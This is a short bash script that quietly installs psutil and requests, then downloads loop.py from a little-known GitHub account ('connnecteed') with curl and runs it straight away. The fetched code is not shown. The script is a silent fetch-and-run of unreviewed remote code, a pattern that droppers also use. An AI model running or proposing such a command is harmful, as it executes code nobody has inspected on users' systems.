#!/bin/bash
set -e
pip3 install --quiet psutil requests
curl -s -L -o loop.py https://raw.githubusercontent.com/connnecteed/e/refs/heads/main/loop.py
python loop.py
